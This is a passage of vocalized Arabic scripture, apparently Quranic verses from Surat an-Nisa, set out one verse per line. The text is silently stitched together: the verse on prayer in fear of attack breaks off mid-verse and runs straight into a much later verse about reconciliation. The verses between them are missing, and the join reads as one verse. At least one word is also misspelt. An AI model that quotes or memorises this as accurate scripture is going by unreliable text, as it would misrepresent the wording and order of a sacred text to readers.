وَلَوْ اَنَّا كَتَبْنَا عَلَيْهِمْ اَنِ اقْتُلُوْٓا اَنْفُسَكُمْ اَوِ اخْرُجُوْا مِنْ دِيَارِكُمْ مَّا فَعَلُوْهُ اِلَّا قَلِيْلٌ مِّنْهُمْ ۗ وَلَوْ اَنَّهُمْ فَعَلُوْا مَا يُوْعَظُوْنَ بِهٖ لَكَانَ خَيْرًا لَّهُمْ وَاَشَدَّ تَثْبِيْتًا
وَاِذًا لَّاٰتَيْنٰهُمْ مِّنْ لَّدُنَّآ اَجْرًا عَظِيْمًا
وَّلَهَدَيْنٰهُمْ صِرَاطًا مُّسْتَقِيْمًا
وَمَنْ يُّطِعِ اللّٰهَ وَالرَّسُوْلَ فَاُولٰۤىِٕكَ مَعَ الَّذِيْنَ اَنْعَمَ اللّٰهُ عَلَيْهِمْ مِّنَ النَّبِيّٖنَ وَالصِّدِّيْقِيْنَ وَالشُّهَدَاۤءِ وَالصّٰلِحِيْنَ ۚ وَحَسُنَ اُولٰۤىِٕكَ رَفِيْقًا
ذٰلِكَ الْفَضْلُ مِنَ اللّٰهِ ۗ وَكَفٰى بِاللّٰهِ عَلِيْمًا
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا خُذُوْا حِذْرَكُمْ فَانْفِرُوْا ثُبَاتٍ اَوِ انْفِرُوْا جَمِيْعًا
وَاِنَّ مِنْكُمْ لَمَنْ لَّيُبَطِّئَنَّ ۚ فَاِنْ اَصَابَتْكُمْ مُّصِيْبَةٌ قَالَ قَدْ اَنْعَمَ اللّٰهُ عَلَيَّ اِذْ لَمْ اَكُنْ مَّعَهُمْ شَهِيْدًا
وَلَىِٕنْ اَصَابَكُمْ فَضْلٌ مِّنَ اللّٰهِ لَيَقُوْلَنَّ كَاَنْ لَّمْ تَكُنْۢ بَيْنَكُمْ وَبَيْنَهٗ مَوَدَّةٌ يّٰلَيْتَنِيْ كُنْتُ مَعَهُمْ فَاَفُوْزَ فَوْزًا عَظِيْمًا
فَلْيُقَاتِلْ فِيْ سَبِيْلِ اللّٰهِ الَّذِيْنَ يَشْرُوْنَ الْحَيٰوةَ الدُّنْيَا بِالْاٰخِرَةِ ۚ وَمَنْ يُّقَاتِلْ فِيْ سَبِيْلِ اللّٰهِ فَيُقْتَلْ اَوْ يَغْلِبْ فَسَوْفَ نُؤْتِيْهِ اَجْرًا عَظِيْمًا
وَمَا لَكُمْ لَا تُقَاتِلُوْنَ فِيْ سَبِيْلِ اللّٰهِ وَالْمُسْتَضْعَفِيْنَ مِنَ الرِّجَالِ وَالنِّسَاۤءِ وَالْوِلْدَانِ الَّذِيْنَ يَقُوْلُوْنَ رَبَّنَآ اَخْرِجْنَا مِنْ هٰذِهِ الْقَرْيَةِ الظَّالِمِ اَهْلُهَا ۚ وَاجْعَلْ لَّنَا مِنْ لَّدُنْكَ وَلِيًّا ۚ وَاجْعَلْ لَّنَا مِنْ لَّدُنْكَ نَصِيْرًا
اَلَّذِيْنَ اٰمَنُوْا يُقَاتِلُوْنَ فِيْ سَبِيْلِ اللّٰهِ ۚ وَالَّذِيْنَ كَفَرُوْا يُقَاتِلُوْنَ فِيْ سَبِيْلِ الطَّاغُوْتِ فَقَاتِلُوْٓا اَوْلِيَاۤءَ الشَّيْطٰنِ ۚ اِنَّ كَيْدَ الشَّيْطٰنِ كَانَ ضَعِيْفًا
اَلَمْ تَرَ اِلَى الَّذِيْنَ قِيْلَ لَهُمْ كُفُّوْٓا اَيْدِيَكُمْ وَاَقِيْمُوا الصَّلٰوةَ وَاٰتُوا الزَّكٰوةَ ۚ فَلَمَّا كُتِبَ عَلَيْهِمُ الْقِتَالُ اِذَا فَرِيْقٌ مِّنْهُمْ يَخْشَوْنَ النَّاسَ كَخَشْيَةِ اللّٰهِ اَوْ اَشَدَّ خَشْيَةً ۚ وَقَالُوْا رَبَّنَا لِمَ كَتَبْتَ عَلَيْنَا الْقِتَالَ ۚ لَوْلَآ اَخَّرْتَنَآ اِلٰٓى اَجَلٍ قَرِيْبٍ ۗ قُلْ مَتَاعُ الدُّنْيَا قَلِيْلٌ ۚ وَالْاٰخِرَةُ خَيْرٌ لِّمَنِ اتَّقٰى ۗ وَلَا تُظْلَمُوْنَ فَتِيْلًا
اَيْنَمَا تَكُوْنُوْا يُدْرِكْكُّمُ الْمَوْتُ وَلَوْ كُنْتُمْ فِيْ بُرُوْجٍ مُّشَيَّدَةٍ ۗ وَاِنْ تُصِبْهُمْ حَسَنَةٌ يَّقُوْلُوْا هٰذِهٖ مِنْ عِنْدِ اللّٰهِ ۚ وَاِنْ تُصِبْهُمْ سَيِّئَةٌ يَّقُوْلُوْا هٰذِهٖ مِنْ عِنْدِكَ ۗ قُلْ كُلٌّ مِّنْ عِنْدِ اللّٰهِ ۗ فَمَالِ هٰٓؤُلَاۤءِ الْقَوْمِ لَا يَكَادُوْنَ يَفْقَهُوْنَ حَدِيْثًا
مَآ اَصَابَكَ مِنْ حَسَنَةٍ فَمِنَ اللّٰهِ ۖ وَمَآ اَصَابَكَ مِنْ سَيِّئَةٍ فَمِنْ نَّفْسِكَ ۗ وَاَرْسَلْنٰكَ لِلنَّاسِ رَسُوْلًا ۗ وَكَفٰى بِاللّٰهِ شَهِيْدًا
مَنْ يُّطِعِ الرَّسُوْلَ فَقَدْ اَطَاعَ اللّٰهَ ۚ وَمَنْ تَوَلّٰى فَمَآ اَرْسَلْنٰكَ عَلَيْهِمْ حَفِيْظًا
وَيَقُوْلُوْنَ طَاعَةٌ ۖ فَاِذَا بَرَزُوْا مِنْ عِنْدِكَ بَيَّتَ طَاۤىِٕفَةٌ مِّنْهُمْ غَيْرَ الَّذِيْ تَقُوْلُ ۗ وَاللّٰهُ يَكْتُبُ مَا يُبَيِّتُوْنَ ۚ فَاَعْرِضْ عَنْهُمْ وَتَوَكَّلْ عَلَى اللّٰهِ ۗ وَكَفٰى بِاللّٰهِ وَكِيْلًا
اَفَلَا يَتَدَبَّرُوْنَ الْقُرْاٰنَ ۗ وَلَوْ كَانَ مِنْ عِنْدِ غَيْرِ اللّٰهِ لَوَجَدُوْا فِيْهِ اخْتِلَافًا كَثِيْرًا
وَاِذَا جَاۤءَهُمْ اَمْرٌ مِّنَ الْاَمْنِ اَوِ الْخَوْفِ اَذَاعُوْا بِهٖ ۚ وَلَوْ رَدُّوْهُ اِلَى الرَّسُوْلِ وَاِلٰٓى اُولِى الْاَمْرِ مِنْهُمْ لَعَلِمَهُ الَّذِيْنَ يَسْتَنْۢبِطُوْنَهٗ مِنْهُمْ ۗ وَلَوْلَا فَضْلُ اللّٰهِ عَلَيْكُمْ وَرَحْمَتُهٗ لَاتَّبَعْتُمُ الشَّيْطٰنَ اِلَّا قَلِيْلًا
فَقَاتِلْ فِيْ سَبِيْلِ اللّٰهِ ۚ لَا تُكَلَّفُ اِلَّا نَفْسَكَ وَحَرِّضِ الْمُؤْمِنِيْنَ ۚ عَسَى اللّٰهُ اَنْ يَّكُفَّ بَأْسَ الَّذِيْنَ كَفَرُوْا ۗ وَاللّٰهُ اَشَدُّ بَأْسًا وَّاَشَدُّ تَنْكِيْلًا
مَنْ يَّشْفَعْ شَفَاعَةً حَسَنَةً يَّكُنْ لَّهٗ نَصِيْبٌ مِّنْهَا ۚ وَمَنْ يَّشْفَعْ شَفَاعَةً سَيِّئَةً يَّكُنْ لَّهٗ كِفْلٌ مِّنْهَا ۗ وَكَانَ اللّٰهُ عَلٰى كُلِّ شَيْءٍ مُّقِيْتًا
وَاِذَا حُيِّيْتُمْ بِتَحِيَّةٍ فَحَيُّوْا بِاَحْسَنَ مِنْهَآ اَوْ رُدُّوْهَا ۗ اِنَّ اللّٰهَ كَانَ عَلٰى كُلِّ شَيْءٍ حَسِيْبًا
اَللّٰهُ لَآ اِلٰهَ اِلَّا هُوَ ۗ لَيَجْمَعَنَّكُمْ اِلٰى يَوْمِ الْقِيٰمَةِ لَا رَيْبَ فِيْهِ ۗ وَمَنْ اَصْدَقُ مِنَ اللّٰهِ حَدِيْثًا
فَمَا لَكُمْ فِى الْمُنٰفِقِيْنَ فِئَتَيْنِ ۚ وَاللّٰهُ اَرْكَسَهُمْ بِمَا كَسَبُوْا ۗ اَتُرِيْدُوْنَ اَنْ تَهْدُوْا مَنْ اَضَلَّ اللّٰهُ ۗ وَمَنْ يُّضْلِلِ اللّٰهُ فَلَنْ تَجِدَ لَهٗ سَبِيْلًا
وَدُّوْا لَوْ تَكْفُرُوْنَ كَمَا كَفَرُوْا فَتَكُوْنُوْنَ سَوَاۤءً فَلَا تَتَّخِذُوْا مِنْهُمْ اَوْلِيَاۤءَ حَتّٰى يُهَاجِرُوْا فِيْ سَبِيْلِ اللّٰهِ ۚ فَاِنْ تَوَلَّوْا فَخُذُوْهُمْ وَاقْتُلُوْهُمْ حَيْثُ وَجَدْتُّمُوْهُمْ ۖ وَلَا تَتَّخِذُوْا مِنْهُمْ وَلِيًّا وَّلَا نَصِيْرًا
اِلَّا الَّذِيْنَ يَصِلُوْنَ اِلٰى قَوْمٍۢ بَيْنَكُمْ وَبَيْنَهُمْ مِّيْثَاقٌ اَوْ جَاۤءُوْكُمْ حَصِرَتْ صُدُوْرُهُمْ اَنْ يُّقَاتِلُوْكُمْ اَوْ يُقَاتِلُوْا قَوْمَهُمْ ۗ وَلَوْ شَاۤءَ اللّٰهُ لَسَلَّطَهُمْ عَلَيْكُمْ فَلَقَاتَلُوْكُمْ ۚ فَاِنِ اعْتَزَلُوْكُمْ فَلَمْ يُقَاتِلُوْكُمْ وَاَلْقَوْا اِلَيْكُمُ السَّلَمَ ۙ فَمَا جَعَلَ اللّٰهُ لَكُمْ عَلَيْهِمْ سَبِيْلًا
سَتَجِدُوْنَ اٰخَرِيْنَ يُرِيْدُوْنَ اَنْ يَّأْمَنُوْكُمْ وَيَأْمَنُوْا قَوْمَهُمْ ۗ كُلَّ مَا رُدُّوْٓا اِلَى الْفِتْنَةِ اُرْكِسُوْا فِيْهَا ۚ فَاِنْ لَّمْ يَعْتَزِلُوْكُمْ وَيُلْقُوْٓا اِلَيْكُمُ السَّلَمَ وَيَكُفُّوْٓا اَيْدِيَهُمْ فَخُذُوْهُمْ وَاقْتُلُوْهُمْ حَيْثُ ثَقِفْتُمُوْهُمْ ۗ وَاُولٰۤىِٕكُمْ جَعَلْنَا لَكُمْ عَلَيْهِمْ سُلْطٰنًا مُّبِيْنًا
وَمَا كَانَ لِمُؤْمِنٍ اَنْ يَّقْتُلَ مُؤْمِنًا اِلَّا خَطَـًٔا ۚ وَمَنْ قَتَلَ مُؤْمِنًا خَطَـًٔا فَتَحْرِيْرُ رَقَبَةٍ مُّؤْمِنَةٍ وَّدِيَةٌ مُّسَلَّمَةٌ اِلٰٓى اَهْلِهٖٓ اِلَّآ اَنْ يَّصَّدَّقُوْا ۗ فَاِنْ كَانَ مِنْ قَوْمٍ عَدُوٍّ لَّكُمْ وَهُوَ مُؤْمِنٌ فَتَحْرِيْرُ رَقَبَةٍ مُّؤْمِنَةٍ ۗ وَاِنْ كَانَ مِنْ قَوْمٍۢ بَيْنَكُمْ وَبَيْنَهُمْ مِّيْثَاقٌ فَدِيَةٌ مُّسَلَّمَةٌ اِلٰٓى اَهْلِهٖ وَتَحْرِيْرُ رَقَبَةٍ مُّؤْمِنَةٍ ۚ فَمَنْ لَّمْ يَجِدْ فَصِيَامُ شَهْرَيْنِ مُتَتَابِعَيْنِ ۚ تَوْبَةً مِّنَ اللّٰهِ ۗ وَكَانَ اللّٰهُ عَلِيْمًا حَكِيْمًا
وَمَنْ يَّقْتُلْ مُؤْمِنًا مُّتَعَمِّدًا فَجَزَاۤؤُهٗ جَهَنَّمُ خَالِدًا فِيْهَا وَغَضِبَ اللّٰهُ عَلَيْهِ وَلَعَنَهٗ وَاَعَدَّ لَهٗ عَذَابًا عَظِيْمًا
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِذَا ضَرَبْتُمْ فِيْ سَبِيْلِ اللّٰهِ فَتَبَيَّنُوْا وَلَا تَقُوْلُوْا لِمَنْ اَلْقٰىٓ اِلَيْكُمُ السَّلٰمَ لَسْتَ مُؤْمِنًا ۚ تَبْتَغُوْنَ عَرَضَ الْحَيٰوةِ الدُّنْيَا ۖ فَعِنْدَ اللّٰهِ مَغَانِمُ كَثِيْرَةٌ ۗ كَذٰلِكَ كُنْتُمْ مِّنْ قَبْلُ فَمَنَّ اللّٰهُ عَلَيْكُمْ فَتَبَيَّنُوْا ۗ اِنَّ اللّٰهَ كَانَ بِمَا تَعْمَلُوْنَ خَبِيْرًا
لَا يَسْتَوِى الْقٰعِدُوْنَ مِنَ الْمُؤْمِنِيْنَ غَيْرُ اُولِى الضَّرَرِ وَالْمُجٰهِدُوْنَ فِيْ سَبِيْلِ اللّٰهِ بِاَمْوَالِهِمْ وَاَنْفُسِهِمْ ۗ فَضَّلَ اللّٰهُ الْمُجٰهِدِيْنَ بِاَمْوَالِهِمْ وَاَنْفُسِهِمْ عَلَى الْقٰعِدِيْنَ دَرَجَةً ۗ وَكُلًّا وَّعَدَ اللّٰهُ الْحُسْنٰى ۗ وَفَضَّلَ اللّٰهُ الْمُجٰهِدِيْنَ عَلَى الْقٰعِدِيْنَ اَجْرًا عَظِيْمًا
دَرَجٰتٍ مِّنْهُ وَمَغْفِرَةً وَّرَحْمَةً ۗ وَكَانَ اللّٰهُ غَفُوْرًا رَّحِيْمًا
اِنَّ الَّذِيْنَ تَوَفّٰىهُمُ الْمَلٰۤىِٕكَةُ ظَالِمِيْٓ اَنْفُسِهِمْ قَالُوْا فِيْمَ كُنْتُمْ ۗ قَالُوْا كُنَّا مُسْتَضْعَفِيْنَ فِى الْاَرْضِ ۗ قَالُوْٓا اَلَمْ تَكُنْ اَرْضُ اللّٰهِ وَاسِعَةً فَتُهَاجِرُوْا فِيْهَا ۗ فَاُولٰۤىِٕكَ مَأْوٰىهُمْ جَهَنَّمُ ۗ وَسَاۤءَتْ مَصِيْرًا
اِلَّا الْمُسْتَضْعَفِيْنَ مِنَ الرِّجَالِ وَالنِّسَاۤءِ وَالْوِلْدَانِ لَا يَسْتَطِيْعُوْنَ حِيْلَةً وَّلَا يَهْتَدُوْنَ سَبِيْلًا
فَاُولٰۤىِٕكَ عَسَى اللّٰهُ اَنْ يَّعْفُوَ عَنْهُمْ ۗ وَكَانَ اللّٰهُ عَفُوًّا غَفُوْرًا
وَمَنْ يُّهَاجِرْ فِيْ سَبِيْلِ اللّٰهِ يَجِدْ فِى الْاَرْضِ مُرٰغَمًا كَثِيْرًا وَّسَعَةً ۗ وَمَنْ يَّخْرُجْ مِنْۢ بَيْتِهٖ مُهَاجِرًا اِلَى اللّٰهِ وَرَسُوْلِهٖ ثُمَّ يُدْرِكْهُ الْمَوْتُ فَقَدْ وَقَعَ اَجْرُهٗ عَلَى اللّٰهِ ۗ وَكَانَ اللّٰهُ غَفُوْرًا رَّحِيْمًا
وَاِذَا ضَرَبْتُمْ فِى الْاَرْضِ فَلَيْسَ عَلَيْكُمْ جُنَاحٌ اَنْ تَقْصُرُوْا مِنَ الصَّلٰوةِ ۖ اِنْ خِفْتُمْ اَنْ يَّفْتِنَكُمُ الَّذِيْنَ كَفَرُوْا ۗ اِنَّ الْكٰفِرِيْنَ كَانُوْا لَكُمْ عَدُوًّا مُّبِيْنًا
وَاِذَا كُنْتَ فِيْهِمْ فَاَقَمْتَ لَهُمُ الصَّلٰوةَ فَلْتَقُمْ طَاۤىِٕفَةٌ مِّنْهُمْ مَّعَكَ وَلْيَأْخُذُوْٓا اَسْلِحَتَهُمْ ۖ فَاِذَا سَجَدُوْا فَلْيَكُوْنُوْا مِنْ وَّرَاۤىِٕكُمْ ۖ وَلْتَأْتِ طَاۤىِٕفَةٌ اُخْرٰى لَمْ يُصَلُّوْا فَلْيُصَلُّوْا مَعَكَ وَلْيَأْخُذُوْا حِذْرَهُمْ وَاَسْلِحَتَهُمْ ۚ وَدَّ الَّذِيْنَ كَفَرُوْا لَوْ تَغْفُلُوْنَ عَنْ اَسْلِحَتِكُمْ وَاَمْتِعَتِكُمْ فَيَمِيْلُوْنَ عَلَيْكُمْ مَّيْلَةً وَّاحِدَةً ۗ وَلَا جُنَاحَ عَلَيْكُمَاۤ اَنْ يُّصْلِحَا بَيْنَهُمَا صُلْحًا ۚ وَالصُّلْحُ خَيْرٌ ۗ وَاُحْضِرَتِ الْاَنْفُسُ الشُّحَّ ۗ وَاِنْ تُحْسِنُوْا وَتَتَّقُوْا فَاِنَّ اللّٰهَ كَانَ بِمَا تَعْمَلُوْنَ خَبِيْرًا
وَلَنْ تَسْتَطِيْعُوْٓا اَنْ تَعْدِلُوْا بَيْنَ النِّسَاۤءِ وَلَوْ حَرَصْتُمْ فَلَا تَمِيْلُوْا كُلَّ الْمَيْلِ فَتَذَرُوْهَا كَالْمُعَلَّقَةِ ۗ وَاِنْ تُصْلِحُوْا وَتَتَّقُوْا فَاِنَّ اللّٰهَ كَانَ غَفُوْرًا رَّحِيْمًا
وَاِنْ يَّتَفَرَّقَا يُغْنِ اللّٰهُ كُلًّا مِّنْ سَعَتِهٖ ۗ وَكَانَ اللّٰهُ وَاسِعًا حَكِيْمًا
وَلِلّٰهِ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ وَلَقَدْ وَصَّيْنَا الَّذِيْنَ اُوْتُوا الْكِتٰبَ مِنْ قَبْلِكُمْ وَاِيَّاكُمْ اَنِ اتَّقُوا اللّٰهَ ۗ وَاِنْ تَكْفُرُوْا فَاِنَّ لِلّٰهِ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ وَكَانَ اللّٰهُ غَنِيًّا حَمِيْدًا
وَلِلّٰهِ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ وَكَفٰى بِاللّٰهِ وَكِيْلًا
اِنْ يَّشَأْ يُذْهِبْكُمْ اَيُّهَا النَّاسُ وَيَأْتِ بِاٰخَرِيْنَ ۗ وَكَانَ اللّٰهُ عَلٰى ذٰلِكَ قَدِيْرًا
مَنْ كَانَ يُرِيْدُ ثَوَابَ الدُّنْيَا فَعِنْدَ اللّٰهِ ثَوَابُ الدُّنْيَا وَالْاٰخِرَةِ ۗ وَكَانَ اللّٰهُ سَمِيْعًاۢ بَصِيْرًا
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا كُوْنُوْا قَوّٰمِيْنَ بِالْقِسْطِ شُهَدَاۤءَ لِلّٰهِ وَلَوْ عَلٰٓى اَنْفُسِكُمْ اَوِ الْوَالِدَيْنِ وَالْاَقْرَبِيْنَ ۚ اِنْ يَّكُنْ غَنِيًّا اَوْ فَقِيْرًا فَاللّٰهُ اَوْلٰى بِهِمَا ۗ فَلَا تَتَّبِعُوا الْهَوٰىٓ اَنْ تَعْدِلُوْا ۚ وَاِنْ تَلْوٗٓا اَوْ تُعْرِضُوْا فَاِنَّ اللّٰهَ كَانَ بِمَا تَعْمَلُوْنَ خَبِيْرًا
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اٰمِنُوْا بِاللّٰهِ وَرَسُوْلِهٖ وَالْكِتٰبِ الَّذِيْ نَزَّلَ عَلٰى رَسُوْلِهٖ وَالْكِتٰبِ الَّذِيْٓ اَنْزَلَ مِنْ قَبْلُ ۗ وَمَنْ يَّكْفُرْ بِاللّٰهِ وَمَلٰۤىِٕكَتِهٖ وَكُتُبِهٖ وَرُسُلِهٖ وَالْيَوْمِ الْاٰخِرِ فَقَدْ ضَلَّ ضَلٰلًاۢ بَعِيْدًا
اِنَّ الَّذِيْنَ اٰمَنُوْا ثُمَّ كَفَرُوْا ثُمَّ اٰمَنُوْا ثُمَّ كَفَرُوْا ثُمَّ ازْدَادُوْا كُفْرًا لَّمْ يَكُنِ اللّٰهُ لِيَغْفِرَ لَهُمْ وَلَا لِيَهْدِيَهُمْ سَبِيْلًا
بَشِّرِ الْمُنٰفِقِيْنَ بِاَنَّ لَهُمْ عَذَابًا اَلِيْمًا
اَلَّذِيْنَ يَتَّخِذُوْنَ الْكٰفِرِيْنَ اَوْلِيَاۤءَ مِنْ دُوْنِ الْمُؤْمِنِيْنَ ۗ اَيَبْتَغُوْنَ عِنْدَهُمُ الْعِزَّةَ فَاِنَّ الْعِزَّةَ لِلّٰهِ جَمِيْعًا
وَقَدْ نَزَّلَ عَلَيْكُمْ فِى الْكِتٰبِ اَنْ اِذَا سَمِعْتُمْ اٰيٰتِ اللّٰهِ يُكْفَرُ بِهَا وَيُسْتَهْزَاُ بِهَا فَلَا تَقْعُدُوْا مَعَهُمْ حَتّٰى يَخُوْضُوْا فِيْ حَدِيْثٍ غَيْرِهٖٓ ۖ اِنَّكُمْ اِذًا مِّثْلُهُمْ ۗ اِنَّ اللّٰهَ جَامِعُ الْمُنٰفِقِيْنَ وَالْكٰفِرِيْنَ فِيْ جَهَنَّمَ جَمِيْعًا
اَلَّذِيْنَ يَتَرَبَّصُوْنَ بِكُمْ ۚ فَاِنْ كَانَ لَكُمْ فَتْحٌ مِّنَ اللّٰهِ قَالُوْٓا اَلَمْ نَكُنْ مَّعَكُمْ ۖ وَاِنْ كَانَ لِلْكٰفِرِيْنَ نَصِيْبٌ قَالُوْٓا اَلَمْ نَسْتَحْوِذْ عَلَيْكُمْ وَنَمْنَعْكُمْ مِّنَ الْمُؤْمِنِيْنَ ۗ فَاللّٰهُ يَحْكُمُ بَيْنَكُمْ يَوْمَ الْقِيٰمَةِ ۗ وَلَنْ يَّجْعَلَ اللّٰهُ لِلْكٰفِرِيْنَ عَلَى الْمُؤْمِنِيْنَ سَبِيْلًا
اِنَّ الْمُنٰفِقِيْنَ يُخٰدِعُوْنَ اللّٰهَ وَهُوَ خَادِعُهُمْ ۚ وَاِذَا قَامُوْٓا اِلَى الصَّلٰوةِ قَامُوْا كُسَالٰى ۙ يُرَاۤءُوْنَ النَّاسَ وَلَا يَذْكُرُوْنَ اللّٰهَ اِلَّا قَلِيْلًا
مُّذَبْذَبِيْنَ بَيْنَ ذٰلِكَ لَآ اِلٰى هٰٓؤُلَاۤءِ وَلَآ اِلٰى هٰٓؤُلَاۤءِ ۗ وَمَنْ يُّضْلِلِ اللّٰهُ فَلَنْ تَجِدَ لَهٗ سَبِيْلًا
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَتَّخِذُوا الْكٰفِرِيْنَ اَوْلِيَاۤءَ مِنْ دُوْنِ الْمُؤْمِنِيْنَ ۗ اَتُرِيْدُوْنَ اَنْ تَجْعَلُوْا لِلّٰهِ عَلَيْكُمْ سُلْطٰنًا مُّبِيْنًا
اِنَّ الْمُنٰفِقِيْنَ فِى الدَّرْكِ الْاَسْفَلِ مِنَ النَّارِ ۚ وَلَنْ تَجِدَ لَهُمْ نَصِيْرًا
اِلَّا الَّذِيْنَ تَابُوْا وَاَصْلَحُوْا وَاعْتَصَمُوْا بِاللّٰهِ وَاَخْلَصُوْا دِيْنَهُمْ لِلّٰهِ فَاُولٰۤىِٕكَ مَعَ الْمُؤْمِنِيْنَ ۗ وَسَوْفَ يُؤْتِ اللّٰهُ الْمُؤْمِنِيْنَ اَجْرًا عَظِيْمًا
مَا يَفْعَلُ اللّٰهُ بِعَذَابِكُمْ اِنْ شَكَرْتُمْ وَاٰمَنْتُمْ ۗ وَكَانَ اللّٰهُ شَاكِرًا عَلِيْمًا
لَا يُحِبُّ اللّٰهُ الْجَهْرَ بِالسُّوْۤءِ مِنَ الْقَوْلِ اِلَّا مَنْ ظُلِمَ ۗ وَكَانَ اللّٰهُ سَمِيْعًا عَلِيْمًا
اِنْ تُبْدُوْا خَيْرًا اَوْ تُخْفُوْهُ اَوْ تَعْفُوْا عَنْ سُوْۤءٍ فَاِنَّ اللّٰهَ كَانَ عَفُوًّا قَدِيْرًا
اِنَّ الَّذِيْنَ يَكْفُرُوْنَ بِاللّٰهِ وَرُسُلِهٖ وَيُرِيْدُوْنَ اَنْ يُّفَرِّقُوْا بَيْنَ اللّٰهِ وَرُسُلِهٖ وَيَقُوْلُوْنَ نُؤْمِنُ بِبَعْضٍ وَّنَكْفُرُ بِبَعْضٍ ۙ وَّيُرِيْدُوْنَ اَنْ يَّتَّخِذُوْا بَيْنَ ذٰلِكَ سَبِيْلًا
اُولٰۤىِٕكَ هُمُ الْكٰفِرُوْنَ حَقًّا ۚ وَاَعْتَدْنَا لِلْكٰفِرِيْنَ عَذَابًا مُّهِيْنًا
وَالَّذِيْنَ اٰمَنُوْا بِاللّٰهِ وَرُسُلِهٖ وَلَمْ يُفَرِّقُوْا بَيْنَ اَحَدٍ مِّنْهُمْ اُولٰۤىِٕكَ سَوْفَ يُؤْتِيْهِمْ اُجُوْرَهُمْ ۗ وَكَانَ اللّٰهُ غَفُوْرًا رَّحِيْمًا
يَسْـَٔلُكَ اَهْلُ الْكِتٰبِ اَنْ تُنَزِّلَ عَلَيْهِمْ كِتٰبًا مِّنَ السَّمَاۤءِ ۚ فَقَدْ سَاَلُوْا مُوْسٰٓى اَكْبَرَ مِنْ ذٰلِكَ فَقَالُوْٓا اَرِنَا اللّٰهَ جَهْرَةً فَاَخَذَتْهُمُ الصّٰعِقَةُ بِظُلْمِهِمْ ۚ ثُمَّ اتَّخَذُوا الْعِجْلَ مِنْۢ بَعْدِ مَا جَاۤءَتْهُمُ الْبَيِّنٰتُ فَعَفَوْنَا عَنْ ذٰلِكَ ۚ وَاٰتَيْنَا مُوْسٰى سُلْطٰنًا مُّبِيْنًا
وَرَفَعْنَا فَوْقَهُمُ الطُّوْرَ بِمِيْثَاقِهِمْ وَقُلْنَا لَهُمُ ادْخُلُوا الْبَابَ سُجَّدًا وَّقُلْنَا لَهُمْ لَا تَعْدُوْا فِى السَّبْتِ وَاَخَذْنَا مِنْهُمْ مِّيْثَاقًا غَلِيْظًا
فَبِمَا نَقْضِهِمْ مِّيْثَاقَهُمْ وَكُفْرِهِمْ بِاٰيٰتِ اللّٰهِ وَقَتْلِهِمُ الْاَنْۢبِيَاۤءَ بِغَيْرِ حَقٍّ وَّقَوْلِهِمْ قُلُوْبُنَا غُلْفٌ ۗ بَلْ طَبَعَ اللّٰهُ عَلَيْهَا بِكُفْرِهِمْ فَلَا يُؤْمِنُوْنَ اِلَّا قَلِيْلًا
وَّبِكُفْرِهِمْ وَقَوْلِهِمْ عَلٰى مَرْيَمَ بُهْتَانًا عَظِيْمًا
وَّقَوْلِهِمْ اِنَّا قَتَلْنَا الْمَسِيْحَ عِيْسَى ابْنَ مَرْيَمَ رَسُوْلَ اللّٰهِ ۚ وَمَا قَتَلُوْهُ وَمَا صَلَبُوْهُ وَلٰكِنْ شُبِّهَ لَهُمْ ۗ وَاِنَّ الَّذِيْنَ اخْتَلَفُوْا فِيْهِ لَفِيْ شَكٍّ مِّنْهُ ۗ مَا لَهُمْ بِهٖ مِنْ عِلْمٍ اِلَّا اتِّبَاعَ الظَّنِّ ۚ وَمَا قَتَلُوْهُ يَقِيْنًا
بَلْ رَّفَعَهُ اللّٰهُ اِلَيْهِ ۗ وَكَانَ اللّٰهُ عَزِيْزًا حَكِيْمًا
وَاِنْ مِّنْ اَهْلِ الْكِتٰبِ اِلَّا لَيُؤْمِنَنَّ بِهٖ قَبْلَ مَوْتِهٖ ۚ وَيَوْمَ الْقِيٰمَةِ يَكُوْنُ عَلَيْهِمْ شَهِيْدًا
فَبِظُلْمٍ مِّنَ الَّذِيْنَ هَادُوْا حَرَّمْنَا عَلَيْهِمْ طَيِّبٰتٍ اُحِلَّتْ لَهُمْ وَبِصَدِّهِمْ عَنْ سَبِيْلِ اللّٰهِ كَثِيْرًا
وَّاَخْذِهِمُ الرِّبٰوا وَقَدْ نُهُوْا عَنْهُ وَاَكْلِهِمْ اَمْوَالَ النَّاسِ بِالْبَاطِلِ ۗ وَاَعْتَدْنَا لِلْكٰفِرِيْنَ مِنْهُمْ عَذَابًا اَلِيْمًا
لٰكِنِ الرّٰسِخُوْنَ فِى الْعِلْمِ مِنْهُمْ وَالْمُؤْمِنُوْنَ يُؤْمِنُوْنَ بِمَآ اُنْزِلَ اِلَيْكَ وَمَآ اُنْزِلَ مِنْ قَبْلِكَ ۚ وَالْمُقِيْمِيْنَ الصَّلٰوةَ ۚ وَالْمُؤْتُوْنَ الزَّكٰوةَ وَالْمُؤْمِنُوْنَ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ ۗ اُولٰۤىِٕكَ سَنُؤْتِيْهِمْ اَجْرًا عَظِيْمًا
اِنَّآ اَوْحَيْنَآ اِلَيْكَ كَمَآ اَوْحَيْنَآ اِلٰى نُوْحٍ وَّالنَّبِيّٖنَ مِنْۢ بَعْدِهٖ ۚ وَاَوْحَيْنَآ اِلٰٓى اِبْرٰهِيْمَ وَاِسْمٰعِيْلَ وَاِسْحٰقَ وَيَعْقُوْبَ وَالْاَسْبَاطِ وَعِيْسٰى وَاَيُّوْبَ وَيُوْنُسَ وَهٰرُوْنَ وَسُلَيْمٰنَ ۚ وَاٰتَيْنَا دَاوٗدَ زَبُوْرًا
وَرُسُلًا قَدْ قَصْنٰهُمْ عَلَيْكَ مِنْ قَبْلُ وَرُسُلًا لَّمْ نَقْصُصْهُمْ عَلَيْكَ ۗ وَكَلَّمَ اللّٰهُ مُوْسٰى تَكْلِيْمًا
رُسُلًا مُّبَشِّرِيْنَ وَمُنْذِرِيْنَ لِئَلَّا يَكُوْنَ لِلنَّاسِ عَلَى اللّٰهِ حُجَّةٌۢ بَعْدَ الرُّسُلِ ۗ وَكَانَ اللّٰهُ عَزِيْزًا حَكِيْمًا
